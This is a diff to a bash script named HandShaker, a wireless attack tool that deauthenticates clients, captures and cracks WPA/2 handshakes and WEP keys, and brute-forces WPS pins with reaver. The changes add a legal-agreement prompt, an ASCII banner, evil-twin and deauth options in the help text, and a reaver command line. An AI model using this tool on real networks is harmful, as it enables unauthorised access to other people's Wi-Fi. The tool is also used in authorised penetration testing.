@@ -16,7 +16,7 @@
 fhelp()																	#Help
 {
 	echo $RST""" 
-HandShaker - Detect, deauth, capture, crack WPA/2 handshakes and WEP Keys automagically. 
+HandShaker - Detect, deauth, capture, crack WPA/2 handshakes, WPS Pins and WEP Keys automagically.  
  by d4rkcat <rfarage@yandex.com>
              
 	Usage: 	handshaker <Method> <Options>
@@ -40,7 +40,7 @@ HandShaker - Detect, deauth, capture, crack WPA/2 handshakes and WEP Keys automa
 		-E  - Use evil twin AP to capture handshakes
 		-M  - Use mdk3 for deauth (default aireplay-ng)
 		-T  - Attempts to capture per AP (default 3)
-		-W  - Only attack WEP encrypted APs
+		-W  - Attack WEP encrypted APs
 		-s  - Silent
 		-h  - This help
 			
@@ -70,6 +70,54 @@ mdk3
 gpsd 
 cowpatty
 pyrit"
+	if [ $(cat $HOME/handshaker_check | grep user_has_agreed) -z ] 2> /dev/null
+	then
+		echo $RED" [*] DO NOT USE THIS TOOL ON WEBSITES OR USERS UNLESS EXPLICITLY AUTHORIZED TO DO SO."
+		echo $RED" [*] BY USING THIS TOOL YOU AGREE NOT TO BREAK ANY LOCAL OR FEDERAL LAWS WHILE USING THIS TOOL."
+		echo $RED" [*] THE AUTHOR IS NOT RESPOSIBLE FOR ANY LOSS OR DAMAGES CAUSED BY THIS TOOL.";echo
+		read -p " [>] Do you agree? [y/n]:" USE
+		if [ $USE = 'y' ] || [ $USE = 'Y' ]
+		then
+			echo 'user_has_agreed' > $HOME/handshaker_check
+			clear
+		else
+			echo 'user_has_not__agreed' > $HOME/handshaker_check
+			echo $RST
+			exit
+		fi
+		clear
+	fi
+
+	echo $BLU"""NNNNDND88O~~~~~~~~~~~~~~~~~~=~~==~~===~=============+====+==++==++:ZOOO?8D8O.OOO
+DNDDDDD8DDD8O=~~~~~~~~~~~~~~~~~~~~=~~~~~~===================$7?+.$D.Z,$DDODINZO8
+NND88D8NDDDDO888Z~~~~~~~~~~~~~~~~~~~~~~~==~~=~~==~=======,,Z8DD8D8DNNND8ZOONNND?
+MND8NNNDDN8DD8O8O8OZ~~~~~~~~~~~~~~~~~~7Z$?I?+====~~~===?,,:8DZOO+IDNNNDDDI+77+~7
+NNDMNNNDDNNDNNNNN8D8OZ~~~~~~~~:~~~~7$:::~~~=~:+++++++I?7::~?DND8+ONNNNND888DN8DZ
+NNNNMNMDNNNMDNNDDNDD.....::~~:~=IZ=++?+=?I?I+~~=+???77$Z8:~I8OZ8D$DD?~.:=888DZZN
+NNMNMNNNNMDN8NNDNDD....:===~~7=~==++==+II77$?+=::7I+II?7Z:~+N7Z~$NNNNDDDNNNNDD8,
+MNNNMNMNNNDNMDNDND,:..,=+++?+III?+==~+7O$$ONNI?+~~7+?I7$Z~:=?788Z8Z...$NDDOZ8DD8
+MNNNNNNNDNNNNNDNN~,,,,+++II7$$7?+==+8Z$7?7$ZIO7$II+?I?I$$7::+8~..?N8D$+$888O8D~O
+NMMMNDNNNNDNNNNN,,:,,+??I77I77?I?I8OZZII+?IIII+??I??II???O8:~+ZZDND$DDNN8.7O?MN?
+NNNNNNNNDNDMNDN,,,,,++?IIII7III$88OOZZ$7IIII??7$+?+?I?I+?Z7,::~$ND8O.:MNNOO8MO8D
+NMMNNNNNNNNMNMN::.,+++II777I7ODOOOZI$$OZZ??II=?II???+++??+?::::=NDO,~Z$NO8O8ND.O
+NNNNNNNNNNNNNNMM,,,,,,:I$777DOZZ$IIIO8D8$?++??I$I?????++++::::::8ND+Z8DDZ:Z?Z+?~
+DNNNNNNNNNNNNMM,,,,,,,,,,?ZO8O$7I?NMD88Z7$II??7IIIII?I++=:,::::::ODOIIZ==I~~~~~~
+,,8NNNNDNDNNNN~,,,,,,,,,,,8OOZII$DD8$O77IIZI?II=:~:?+,7=,,,,:,::::~+7I:::::~:~~~
+,,,,,8NNMNNDN,,,,,,,,,,,,:$7?~+?88D$$IIDD88+,~8?~:=:~,,,,,,,,,,,,:::::::::::~::~
+,,,,,,,,8DND,,,,,,,,,,,,,,=~,,,I8Z$I?DO$88D=~:~=7+=~,,,,,,,,,,,,,,,,::::::::::::
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,?I?8OZ77ZO=I?==~~~,,,,,,,,,,,,,,,,,,,,,:::::::::
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,$I?8OO+=~=~~~.,,,,,,,,,,,,,,,,,,,,,,::::::::
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,..,.,+II?.=~,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:,::
+$RED _    _                    _   _____  _             _               
+| |  | |                  | | / ____|| |           | |              
+| |__| |  __ _  _ __    __| || (___  | |__    __ _ | | __ ___  _ __ 
+|  __  | / _  ||  _ \  / _  | \___ \ |  _ \  / _  || |/ // _ \|  __|
+| |  | || (_| || | | || (_| | ____) || | | || (_| ||   <|  __/| |   
+|_|  |_| \__ _||_| |_| \__ _||_____/ |_| |_| \__ _||_|\_\\___| |_|   
+                                                          
+                                                         By d4rkcat..            
+"
+sleep 2
 	for COMMAND in $LIST
 	do
 		if [ $(which $COMMAND) -z ] 2> /dev/null
@@ -1202,20 +1250,19 @@ freaver()
 	NUM=0
 	for ESSID in $ESSIDS
 	do
-	NUM=$((NUM + 1))
-	echo " [$NUM] $ESSID"
+		NUM=$((NUM + 1))
+		echo " [$NUM] $ESSID"
 	done
-	echo "$ESSIDS" > tmp
 	read -p $GRN"  >" AP
 	AP=$(( AP + 1 ))
-	ESSID=$(cat tmp | sed -n "$AP"p)
+	ESSID=$(echo "$ESSIDS" | sed -n "$AP"p)
 	BSSID=$(cat wash.log | grep $ESSID | cut -d ' ' -f 1)
 	CHAN=$(cat wash.log | grep $ESSID | cut -d ' ' -f 8)
 	if [ $CHAN -z ] 2> /dev/null
 	then
 		CHAN=$(cat wash.log | grep $ESSID | cut -d ' ' -f 7)
 	fi
-	rm wash.log
+	rm -rf wash.log
 	echo $BLU
 	reaver -i $MON1 -c $CHAN -b $BSSID -a -w -v
 	fexit ' '
